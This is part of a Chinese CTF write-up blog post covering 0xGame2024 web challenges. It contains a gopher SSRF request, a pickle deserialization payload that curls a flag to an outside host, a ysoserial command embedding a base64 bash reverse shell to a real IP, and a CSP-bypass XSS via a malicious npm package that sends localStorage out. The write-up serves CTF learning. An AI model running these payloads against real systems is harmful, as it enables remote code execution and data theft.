+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /visit?url=gopher://0.0.0.0:8000/_%25%35%30%25%34%66%25%35%33%25%35%34%25%32%30%25%32%66%25%36%33%25%36%64%25%36%34%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%64%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%34%25%33%37%25%32%65%25%33%37%25%33%36%25%32%65%25%33%31%25%33%35%25%33%31%25%32%65%25%33%31%25%33%39%25%33%32%25%33%61%25%33%36%25%33%30%25%33%30%25%33%38%25%33%37%25%30%64%25%30%61%25%35%35%25%37%33%25%36%35%25%37%32%25%32%64%25%34%31%25%36%37%25%36%35%25%36%65%25%37%34%25%33%61%25%32%30%25%34%64%25%36%66%25%37%61%25%36%39%25%36%63%25%36%63%25%36%31%25%32%66%25%33%35%25%32%65%25%33%30%25%32%30%25%32%38%25%35%37%25%36%39%25%36%65%25%36%34%25%36%66%25%37%37%25%37%33%25%32%30%25%34%65%25%35%34%25%32%30%25%33%31%25%33%30%25%32%65%25%33%30%25%33%62%25%32%30%25%35%37%25%36%39%25%36%65%25%33%36%25%33%34%25%33%62%25%32%30%25%37%38%25%33%36%25%33%34%25%33%62%25%32%30%25%37%32%25%37%36%25%33%61%25%33%31%25%33%33%25%33%31%25%32%65%25%33%30%25%32%39%25%32%30%25%34%37%25%36%35%25%36%33%25%36%62%25%36%66%25%32%66%25%33%32%25%33%30%25%33%31%25%33%30%25%33%30%25%33%31%25%33%30%25%33%31%25%32%30%25%34%36%25%36%39%25%37%32%25%36%35%25%36%36%25%36%66%25%37%38%25%32%66%25%33%31%25%33%33%25%33%31%25%32%65%25%33%30%25%30%64%25%30%61%25%34%31%25%36%33%25%36%33%25%36%35%25%37%30%25%37%34%25%33%61%25%32%30%25%37%34%25%36%35%25%37%38%25%37%34%25%32%66%25%36%38%25%37%34%25%36%64%25%36%63%25%32%63%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%36%38%25%37%34%25%36%64%25%36%63%25%32%62%25%37%38%25%36%64%25%36%63%25%32%63%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%36%64%25%36%63%25%33%62%25%37%31%25%33%64%25%33%30%25%32%65%25%33%39%25%32%63%25%36%39%25%36%64%25%36%31%25%36%37%25%36%35%25%32%66%25%36%31%25%37%36%25%36%39%25%36%36%25%32%63%25%36%39%25%36%64%25%36%31%25%36%37%25%36%35%25%32%66%25%37%37%25%36%35%25%36%32%25%37%30%25%32%63%25%36%39%25%36%64%25%36%31%25%36%37%25%36%35%25%32%66%25%37%30%25%36%65%25%36%37%25%32%63%25%36%39%25%36%64%25%36%31%25%36%37%25%36%35%25%32%66%25%37%33%25%37%36%25%36%37%25%32%62%25%37%38%25%36%64%25%36%63%25%32%63%25%32%61%25%32%66%25%32%61%25%33%62%25%37%31%25%33%64%25%33%30%25%32%65%25%33%38%25%30%64%25%30%61%25%34%31%25%36%33%25%36%33%25%36%35%25%37%30%25%37%34%25%32%64%25%34%63%25%36%31%25%36%65%25%36%37%25%37%35%25%36%31%25%36%37%25%36%35%25%33%61%25%32%30%25%37%61%25%36%38%25%32%64%25%34%33%25%34%65%25%32%63%25%37%61%25%36%38%25%33%62%25%37%31%25%33%64%25%33%30%25%32%65%25%33%38%25%32%63%25%37%61%25%36%38%25%32%64%25%35%34%25%35%37%25%33%62%25%37%31%25%33%64%25%33%30%25%32%65%25%33%37%25%32%63%25%37%61%25%36%38%25%32%64%25%34%38%25%34%62%25%33%62%25%37%31%25%33%64%25%33%30%25%32%65%25%33%35%25%32%63%25%36%35%25%36%65%25%32%64%25%35%35%25%35%33%25%33%62%25%37%31%25%33%64%25%33%30%25%32%65%25%33%33%25%32%63%25%36%35%25%36%65%25%33%62%25%37%31%25%33%64%25%33%30%25%32%65%25%33%32%25%30%64%25%30%61%25%34%31%25%36%33%25%36%33%25%36%35%25%37%30%25%37%34%25%32%64%25%34%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%39%25%36%65%25%36%37%25%33%61%25%32%30%25%36%37%25%37%61%25%36%39%25%37%30%25%32%63%25%32%30%25%36%34%25%36%35%25%36%36%25%36%63%25%36%31%25%37%34%25%36%35%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%36%65%25%36%35%25%36%33%25%37%34%25%36%39%25%36%66%25%36%65%25%33%61%25%32%30%25%36%33%25%36%63%25%36%66%25%37%33%25%36%35%25%30%64%25%30%61%25%35%35%25%37%30%25%36%37%25%37%32%25%36%31%25%36%34%25%36%35%25%32%64%25%34%39%25%36%65%25%37%33%25%36%35%25%36%33%25%37%35%25%37%32%25%36%35%25%32%64%25%35%32%25%36%35%25%37%31%25%37%35%25%36%35%25%37%33%25%37%34%25%37%33%25%33%61%25%32%30%25%33%31%25%30%64%25%30%61%25%35%30%25%37%32%25%36%39%25%36%66%25%37%32%25%36%39%25%37%34%25%37%39%25%33%61%25%32%30%25%37%35%25%33%64%25%33%30%25%32%63%25%32%30%25%36%39%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%32%64%25%37%37%25%37%37%25%37%37%25%32%64%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%37%35%25%37%32%25%36%63%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35%25%36%34%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%61%25%32%30%25%33%37%25%30%64%25%30%61%25%30%64%25%30%61%25%36%33%25%36%64%25%36%34%25%33%64%25%36%35%25%36%65%25%37%36 HTTP/1.1</span><br><span class="line">Host: 47.76.151.192:60087</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="baby-pickle"><a href="#baby-pickle" class="headerlink" title="baby_pickle"></a>baby_pickle</h3><p>参考链接：<a target="_blank" rel="noopener" href="https://goodapple.top/archives/1069%EF%BC%8C%E5%85%B6%E4%B8%AD%E5%90%84%E4%B8%AAopcode%E7%9A%84%E8%A7%A3%E9%87%8A%E9%83%BD%E8%AE%B2%E7%9A%84%E5%BE%88%E6%B8%85%E6%A5%9A%E3%80%82">https://goodapple.top/archives/1069，其中各个opcode的解释都讲的很清楚。</a></p>
+<p>这个题就是考察⼿搓opcode，正常的序列化难免会有⼀些冗余数据像\x00等等，还有⼀些标识位。</p>
+<p>姿势：<code>pickle.loads()</code>是可以自动import的，这一点为我们的攻击提供了方便。</p>
+<p>源码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">UserPool = &#123;&#125;</span><br><span class="line">BlackList = [<span class="string">b&#x27;\x00&#x27;</span>, <span class="string">b&#x27;\x1e&#x27;</span>, <span class="string">b&#x27;system&#x27;</span>, <span class="string">b&#x27;popen&#x27;</span>, <span class="string">b&#x27;os&#x27;</span>, <span class="string">b&#x27;sys&#x27;</span>, <span class="string">b&#x27;posix&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    username = <span class="literal">None</span></span><br><span class="line">    password = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    data = request.form.get(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        opcode = b64decode(data)</span><br><span class="line">        <span class="keyword">for</span> word <span class="keyword">in</span> BlackList:</span><br><span class="line">            <span class="keyword">if</span> word <span class="keyword">in</span> opcode:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Hacker!&quot;</span></span><br><span class="line">        user = pickle.loads(opcode)</span><br><span class="line">        <span class="built_in">print</span>(user)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;h1&gt;Hello &#123;&#125;&lt;/h1&gt;&quot;</span>.<span class="built_in">format</span>(user.username)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> UserPool.keys() <span class="keyword">and</span> password == UserPool[username].password:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&lt;h1&gt;Hello &#123;&#125;&lt;/h1&gt;&quot;</span>.<span class="built_in">format</span>(User.username)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> username <span class="keyword">in</span> UserPool.keys():</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;h1&gt;用户&#123;&#125;已存在&lt;/h1&gt;&quot;</span>.<span class="built_in">format</span>(username)</span><br><span class="line">    UserPool[username] = password</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;h1&gt;注册成功&lt;/h1&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这⿊名单其实和没过滤⼀样，利⽤ pty 去执⾏命令就可以</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">opcode=&#x27;&#x27;&#x27;(cbuiltins</span><br><span class="line">eval</span><br><span class="line">S&#x27;__import__(\&#x27;pty\&#x27;).spawn([\&#x27;bash\&#x27;,\&#x27;-c\&#x27;,\&#x27;echo Y3VybCAtWCBQT1NUIGh0dHA6Ly9paDM1YTNjYTRnZG56emFkaWRwNTBsN2tzYnkybXNhaC5vYXN0aWZ5LmNvbSAtZCAkKGNhdCAvdG1wL2ZsYWcp|base64 -d|bash\&#x27;])&#x27;</span><br><span class="line">o.&#x27;&#x27;&#x27;.encode()</span><br><span class="line">print(base64.b64encode(opcode).decode())</span><br><span class="line"></span><br><span class="line">//其中base64值是curl -X POST http://ih35a3ca4gdnzzadidp50l7ksby2msah.oastify.com -d $(cat /tmp/flag)</span><br></pre></td></tr></table></figure>
+
+<p>测试的时候没打通。</p>
+<h3 id="WhySoSerial"><a href="#WhySoSerial" class="headerlink" title="WhySoSerial"></a>WhySoSerial</h3><p>考察的是java反序列化，题目给的jar包的依赖中有commons-collections3.2.1，在ysoserial工具的README.md中查gadget。</p>
+<p>ps：两个构造命令的网站：<a target="_blank" rel="noopener" href="https://bewhale.github.io/tools/encode.html%E3%80%81https://ares-x.com/tools/runtime-exec/">https://bewhale.github.io/tools/encode.html、https://ares-x.com/tools/runtime-exec/</a></p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections6 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84Mi4xNTYuMTEzLjIxNy8yMzMzIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;|base64</span><br></pre></td></tr></table></figure>
+
+<p>测试的时候没打通。</p>
+<h3 id="paste-bin"><a href="#paste-bin" class="headerlink" title="paste_bin"></a>paste_bin</h3><p>考察的是XSS+CSP绕过。学习链接：<a target="_blank" rel="noopener" href="https://aszx87410.github.io/beyond-xss/">https://aszx87410.github.io/beyond-xss/</a></p>
+<p>想要帮网页加上CSP有兩种方式，一种是经由HTTP response header的<code>Content-Security-Policy</code>，另外一种是经由<code>&lt;meta&gt;</code>标签，本题是通过<code>&lt;meta&gt;</code>标签设置的，但实际上比较常用的是前者，因為有些规则只能通过前者来设定）</p>
+<p>题目附件给的是rust语言，但实际上做出这道题几乎只需要看网站主页的前端代码。</p>
+<p>index.html的header部分：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Pastebin - Home<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.tailwindcss.com/3.4.5&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">content</span>=<span class="string">&quot;base-uri &#x27;none&#x27;; style-src &#x27;unsafe-inline&#x27;; script-src &#x27;self&#x27; &#x27;sha256-mDsn/yxO0Kbxaggx7bFdeBmrC22U6cePGEUeeSwO+n0=&#x27; cdn.tailwindcss.com unpkg.com cdn.jsdelivr.net;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到用meta标签设置了CSP</p>
+<p>script-src⽤于限制JavaScript代码加载的来源, 包含如下⼏个条⽬：</p>
+<ul>
+<li><p>self: 表⽰仅允许加载同源⽹站(当前⽹站)下的js文件, 例如&#x2F;static&#x2F;⽬录⾥index.js、view.js、report.js </p>
+</li>
+<li><p>sha256：表示允许加载某个js，该js的sha256的base64为mDsn&#x2F;yxO0Kbxaggx7bFdeBmrC22U6cePGEUeeSwO+n0&#x3D;(为了加载tailwindcss的js脚本, 对于解题来说不重要)</p>
+</li>
+<li><p>cdn.tailwindcss.com，unpkg.com，cdn.jsdelivr.net：表⽰允许加载这三个⽹站下的js⽂件</p>
+</li>
+</ul>
+<p>先说下为什么这道题不能<code>&lt;script&gt;alert(1);&lt;/script&gt;</code>⼀把梭, 这是因为script-src内并没有unsafe-inline这⼀项，看清楚是style-src有unsafe-inline这一项，所以说以上内联的JavaScript代码就不允许被执行。</p>
+<p>这道题的思路是后⾯两个：jsdelivr 和unpkg，这两个东西都是CDN服务， 即开发者发布的npm包都可以通过这两个CDN加载。</p>
+<ul>
+<li><p>jsdelivr: <a target="_blank" rel="noopener" href="https://www.jsdelivr.com/">https://www.jsdelivr.com/</a></p>
+</li>
+<li><p>unpkg: <a target="_blank" rel="noopener" href="https://unpkg.com/">https://unpkg.com/</a></p>
+</li>
+</ul>
+<p>那CDN缓存的是哪⾥的npm包呢? 答案是 <a target="_blank" rel="noopener" href="https://www.npmjs.com/">https://www.npmjs.com/</a></p>
+<p>因此我们只需要在 <a target="_blank" rel="noopener" href="https://www.npmjs.com/">https://www.npmjs.com/</a> 注册账号, 然后上传⼀个npm包, 包内包含恶意的js⽂件, 最后通过jsdelivr或unpkg加载即可。</p>
+<p>例如我传的这个my-package-aaa: <a target="_blank" rel="noopener" href="https://www.npmjs.com/package/my-package-aaa">https://www.npmjs.com/package/my-package-aaa</a></p>
+<p>其unpkg地址为 <a target="_blank" rel="noopener" href="https://unpkg.com/my-package-aaa@1.1.0/">https://unpkg.com/my-package-aaa@1.1.0/</a></p>
+<p>包⾥包含⼀个poc.js⽂件, 内容如下：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> flag = <span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&#x27;flag&#x27;</span>);</span><br><span class="line">location.<span class="property">href</span> = <span class="string">&#x27;http://ip:port/?flag=&#x27;</span> + flag;</span><br></pre></td></tr></table></figure>
+
+<p>代码的功能就是从localStorage中获取flag(⾄于为什么flag在localStorage, 可以看src&#x2F;bot.rs) 然后发送到vps上</p>
+<p>src&#x2F;bot.rs部分代码:</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">visit_paste</span>(id: &amp;<span class="type">str</span>) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;(), <span class="type">Box</span>&lt;<span class="keyword">dyn</span> std::error::Error&gt;&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">flag</span>: <span class="type">String</span> = env::<span class="title function_ invoke__">var</span>(<span class="string">&quot;FLAG&quot;</span>).<span class="title function_ invoke__">unwrap_or</span>(<span class="string">&quot;flag&#123;test&#125;&quot;</span>.<span class="title function_ invoke__">to_string</span>());</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">js</span> = <span class="built_in">format!</span>(<span class="string">&quot;localStorage.setItem(&#x27;flag&#x27;, &#x27;&#123;&#125;&#x27;);&quot;</span>, flag);</span><br></pre></td></tr></table></figure>
+
+<p>可以看到是从环境变量里取出flag并加入到localStorage的flag字段中。</p>
+<p>注意代码使⽤的是location.href⽽不是fetch api, 这样也是为了绕过CSP的规则，所以最终的payload如下</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe srcdoc=<span class="string">&quot;&lt;script src=&#x27;https://unpkg.com/my-package-x1r0z@1.1.0/poc.js&#x27;&gt;</span></span><br><span class="line"><span class="string">&lt;/script&gt;&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="toc-number">1.</span> <span class="toc-text">写在前面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">知识点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hello-shell"><span class="toc-number">3.</span> <span class="toc-text">hello_shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hello-pe"><span class="toc-number">4.</span> <span class="toc-text">hello_pe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hello-ssrf"><span class="toc-number">5.</span> <span class="toc-text">hello_ssrf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-pickle"><span class="toc-number">6.</span> <span class="toc-text">baby_pickle</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WhySoSerial"><span class="toc-number">7.</span> <span class="toc-text">WhySoSerial</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#paste-bin"><span class="toc-number">8.</span> <span class="toc-text">paste_bin</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/10/21/0xGame2024web%E5%A4%8D%E7%8E%B0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/10/21/0xGame2024web%E5%A4%8D%E7%8E%B0/&text=0xGame2024web复现"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/10/21/0xGame2024web%E5%A4%8D%E7%8E%B0/&title=0xGame2024web复现"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/10/21/0xGame2024web%E5%A4%8D%E7%8E%B0/&is_video=false&description=0xGame2024web复现"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=0xGame2024web复现&body=Check out this article: http://example.com/2024/10/21/0xGame2024web%E5%A4%8D%E7%8E%B0/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/10/21/0xGame2024web%E5%A4%8D%E7%8E%B0/&title=0xGame2024web复现"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/10/21/0xGame2024web%E5%A4%8D%E7%8E%B0/&title=0xGame2024web复现"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/10/21/0xGame2024web%E5%A4%8D%E7%8E%B0/&title=0xGame2024web复现"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/10/21/0xGame2024web%E5%A4%8D%E7%8E%B0/&title=0xGame2024web复现"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/10/21/0xGame2024web%E5%A4%8D%E7%8E%B0/&name=0xGame2024web复现&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/10/21/0xGame2024web%E5%A4%8D%E7%8E%B0/&t=0xGame2024web复现"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    k1ato
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
